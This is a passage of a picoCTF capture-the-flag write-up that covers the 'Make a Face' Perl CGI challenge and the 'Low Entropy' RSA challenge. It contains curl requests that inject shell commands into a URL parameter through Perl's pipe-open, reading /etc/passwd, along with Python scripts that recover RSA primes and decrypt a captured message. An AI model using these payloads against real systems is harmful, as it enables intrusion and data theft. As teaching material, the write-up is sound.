</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">NOSE</span><span class="p">,</span><span class="s">&quot;nose&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Nose&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">MOUTH</span><span class="p">,</span><span class="s">&quot;mouth&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Mouth&#39;</span><span class="p">));</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="n">EYES</span><span class="p">,</span><span class="s">&quot;eyes&quot;</span><span class="o">.</span><span class="nv">$q</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;Eyes&#39;</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="nb">read</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="nv">$headb</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">HAIR</span><span class="p">,</span><span class="nv">$hairb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">NOSE</span><span class="p">,</span><span class="nv">$noseb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">MOUTH</span><span class="p">,</span><span class="nv">$mouthb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">read</span><span class="p">(</span><span class="n">EYES</span><span class="p">,</span><span class="nv">$eyesb</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">print</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$headb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$hairb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$noseb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$mouthb</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$eyesb</span><span class="p">)));</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">;</span>
</span><span class='line'>  <span class="o">...</span><span class="n">generate</span> <span class="n">page</span><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t really inject anything into the parameter fields, as the value is concatenated with &ldquo;head&rdquo;, &ldquo;hair&rdquo;, etc. No calls to <code>system</code> or <code>eval</code> are made, no backticks were used. However, perl being perl, has another <a href="http://www.cgisecurity.com/lib/sips.html">trick up it&rsquo;s sleeve</a>:</p>

<p><code>
If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.
</code></p>

<p>That&rsquo;s handy! Let&rsquo;s try it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>curl <span class="s2">&quot;http://makeaface.picoctf.com/index.cgi?Head=%20/etc/passwd|&amp;Hair=1.bmp&amp;Nose=2.bmp&amp;Mouth=2.bmp&amp;Eyes=3.bmp&quot;</span>
</span><span class='line'>BM....binnologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></code></pre></td></tr></table></div></figure>


<p>It returns a few lines of /etc/passwd, albeit mangled a bit. This works, because the &ldquo;head&rdquo; parameter is used in the open statement like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nb">open</span><span class="p">(</span><span class="n">HEAD</span><span class="p">,</span><span class="s">&quot;head /etc/passwd|&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This makes perl believe that it is a command from which we want to see output! From here, we enumerated the webdirectory and Swappage came up with the brilliant solution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>curl <span class="s2">&quot;http://makeaface.picoctf.com/index.cgi?Head=%20|cat%20/etc/passwd%26%26ls%20-la|&amp;Hair=1.bmp&amp;Nose=2.bmp&amp;Mouth=2.bmp&amp;Eyes=3.bmp&quot;</span>
</span><span class='line'>BM...hex bytes...binnologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:106::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:103:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>pollinate:x:105:1::/var/cache/pollinate:/bin/false
</span><span class='line'>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
</span><span class='line'>total 228
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">27</span> 03:57 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">27</span> 03:47 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">34</span> Oct <span class="m">27</span> 03:48 SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root  <span class="m">452</span> Oct <span class="m">27</span> 03:48 css.css
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes1.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes2.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes3.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 eyes4.bmp
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">8338</span> Oct <span class="m">27</span> 03:48 hair0.bmp
</span></code></pre></td></tr></table></div></figure>


<p>Because that file, <code>SECRET_KEY_2b609783951a8665d8c67d721b52b0f8</code> is world-readable and in the webdirectory, we could just browse to it and grab the flag: <code>why_did_we_stop_using_perl_again?</code></p>

<h1>Low Entropy (110 points)</h1>

<p>We are given a server to connect to and a pcap file. We need to decrypt the message found in the pcap file. This message was encoded with a private RSA key.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the Thyrin drop box. Please send your public key and message.
</span><span class='line'>Public key: c20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f
</span><span class='line'>Message: 49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e
</span></code></pre></td></tr></table></div></figure>


<p>The server spits out the product of two primes, which gives us a lot of possible public keys. We need to find the factors <code>p</code> and <code>q</code>, the factors of the captured public key. If we have those factors, it&rsquo;s game over. Luckily, the server has only 30 primes to choose from. That means that there are 30 * 29 / 2 = 435 possible keys. Let&rsquo;s first grab all these products of <code>p</code> and <code>q</code> and store them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">products</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">30</span><span class="o">*</span><span class="mi">29</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span><span class="mi">51818</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># banner</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">pq</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="n">pq</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="s">&quot;0&quot;</span><span class="o">+</span><span class="n">pq</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="n">pq</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">pq</span> <span class="ow">in</span> <span class="n">products</span><span class="p">:</span>
</span><span class='line'>      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;public_keys&#39;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>          <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pq</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>              
</span><span class='line'>      <span class="n">products</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">pq</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;Now at {} products...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">products</span><span class="p">))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This should grab the 435 unique public keys. Next, we need to find the primes that constitute the captured public key. Basically, we have a list of <code>a1*a2, a1*a3, a2*a3...</code> for 30 unique primes. Let&rsquo;s assume the captured public key is derived from the values <code>a1</code> and <code>a2</code>. Given a large list of other values ax*ay and some math, we can say that there are values that satisfy:</p>

<p><code>
(a1*a2 / (a1*a3) * a2*a3 == a2*a2
</code></p>

<p>Therefore, we can extract the squared values of each prime! I skipped using <code>math.sqrt()</code> and python <code>float</code> values, as these do not have the required precision given these extremely large numbers. Let&rsquo;s generate all these squared values from each key we got from the server. Then, divide the square of the public key by each entry. If the result is also in the list of squared primes, then we have a match!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;public_keys&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'><span class="n">alice_key</span> <span class="o">=</span> <span class="mh">0xc20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f</span>
</span><span class='line'>
</span><span class='line'><span class="n">public_keys</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
</span><span class='line'>      <span class="n">public_keys</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>  
</span><span class='line'><span class="n">squares</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>    <span class="c"># sets are fast :)</span>
</span><span class='line'><span class="k">for</span> <span class="n">key_a</span> <span class="ow">in</span> <span class="n">public_keys</span><span class="p">:</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">key_b</span> <span class="ow">in</span> <span class="n">public_keys</span> <span class="o">-</span> <span class="nb">set</span><span class="p">([</span><span class="n">key_a</span><span class="p">]):</span>
</span><span class='line'>      <span class="n">squares</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">alice_key</span> <span class="o">*</span> <span class="n">key_a</span><span class="p">)</span> <span class="o">/</span> <span class="n">key_b</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">squares</span><span class="p">:</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">alice_key</span><span class="o">**</span><span class="mi">2</span> <span class="o">/</span> <span class="n">k</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">squares</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">alice_key</span><span class="o">**</span><span class="mi">2</span> <span class="o">==</span> <span class="n">l</span><span class="o">*</span><span class="n">k</span><span class="p">:</span> <span class="c"># double-check to prevent rounding errors</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] Found k={}</span><span class="se">\n</span><span class="s">l={}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>It should return two values for k and l (because k could be l and vice-versa):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>!<span class="o">]</span> Found <span class="nv">k</span><span class="o">=</span>145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401
</span><span class='line'><span class="nv">l</span><span class="o">=</span>127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561
</span></code></pre></td></tr></table></div></figure>


<p>Now, all we have to do is take the square root of these values to get <code>p</code> and <code>q</code>! Luckily, <a href="http://stackoverflow.com/questions/15390807/integer-square-root-in-python/15391420#15391420">Newton&rsquo;s algorithm</a> works perfectly for integers. The server gave us the public exponent (2<sup>16</sup>+1) so we are all set for decrypting the message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="n">x</span> <span class="o">=</span> <span class="n">n</span>
</span><span class='line'>    <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span><span class='line'>    <span class="k">while</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="n">x</span><span class="p">:</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="n">y</span>
</span><span class='line'>        <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">n</span> <span class="o">//</span> <span class="n">x</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span><span class='line'>      
</span><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span><span class="o">+</span><span class="mi">1</span>
</span><span class='line'><span class="n">k</span> <span class="o">=</span> <span class="mi">127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561</span>
</span><span class='line'><span class="n">l</span> <span class="o">=</span> <span class="mi">145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span><span class='line'><span class="n">c</span> <span class="o">=</span> <span class="mh">0x49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
</span><span class='line'><span class="n">tot</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">tot</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This gives us the decoded hexadecimal representation of the message. Running it through <code>xxd</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/low_entropy<span class="nv">$ </span>python solve.py
</span><span class='line'>0x476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732eL
</span><span class='line'>bas@tritonal:~/tmp/picoctf/low_entropy<span class="nv">$ </span>xxd -r -p
</span><span class='line'>476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732e
</span><span class='line'>Good thing no one can <span class="nb">read </span>this! I<span class="err">&#39;</span>d hate <span class="k">for</span> them to know that the flag is make_sure_your_rng_generates_lotsa_primes.
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>make_sure_your_rng_generates_lotsa_primes</code>.</p>

<h1>Bit Puzzle (130 points)</h1>

<p>The last bastion of PicoCTF! <code>bitpuzzle</code> is a 32-bit ELF file. It asks for a string and first checks if the string is 32 bytes long. Then, it chops it up into four-byte chunks and does certain checks on each chunk, effectively constraining the values that are valid. In the end, if the string passes all checks, then that string is the flag. Looking at other flags, this probably limited our characterset to lowercase plus underscore. The first chuck-checking constraint was this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
